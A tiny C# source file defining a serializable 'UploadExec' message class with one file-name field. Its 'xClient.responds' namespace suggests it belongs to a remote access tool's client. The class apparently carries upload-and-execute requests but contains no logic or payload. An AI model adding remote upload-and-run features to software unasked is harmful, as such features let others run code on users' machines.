using System;
using System.Collections.Generic;
using System.Text;

namespace xClient.responds
{
    [Serializable]
    class UploadExec : respond
    {
        public String file;
        public UploadExec(string f)
        {
            file = f;
        }
    }
}
